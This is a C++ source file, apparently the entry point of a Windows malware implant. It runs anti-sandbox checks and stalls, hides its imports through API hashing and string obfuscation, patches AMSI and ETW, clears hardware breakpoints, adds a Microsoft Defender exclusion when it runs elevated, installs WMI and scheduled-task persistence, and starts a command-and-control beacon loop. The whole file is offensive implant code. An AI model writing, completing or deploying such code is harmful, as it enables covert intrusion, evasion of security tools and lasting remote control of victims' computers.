#include <windows.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// NtDelayExecution inline helper — no Sleep() in IAT
static void NtSleep(DWORD ms) {
    typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
    static NtDelayExecution_t pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        pfn = reinterpret_cast<NtDelayExecution_t>(
            HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    }
}

// Decoy compute loop — looks like legitimate work to a sandbox timer
static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    // Anti-sandbox: decoy compute first, then uptime/CPUID check
    DecoyLoop();
    if (SandboxCheck()) {
        NtSleep(600000); // 10 min stall — outlast sandbox timeout
        return 0;
    }

    // Loop InitializeSyscalls until success
    while (!InitializeSyscalls()) {
        NtSleep(5000);
    }

    // Apply initial evasion
    PatchAMSI();
    PatchETW();
    ClearHardwareBreakpoints();

    // Optional: add Defender exclusion if elevated
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (IsElevated()) {
        AddDefenderExclusion(exePath);
    }

    // Install persistence (WMI and Scheduled Tasks)
    if (!IsWmiPersistenceInstalled()) {
        InstallWmiPersistence(exePath);
    }
    InstallScheduledTaskPersistence(exePath);

    // Enter C2 beacon loop
    BeaconLoop();

    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hKernel32) return 0;
    
    auto _CreateThread = HASHPROC(hKernel32, CreateThread);
    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
    if (!_CreateThread || !_CloseHandle) return 0;

    HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
    if (hThread) {
        _CloseHandle(hThread);
    }

    // Main thread: NtDelayExecution loop — no Sleep() in IAT
    while (true) {
        NtSleep(60000);
    }

    return 0;
}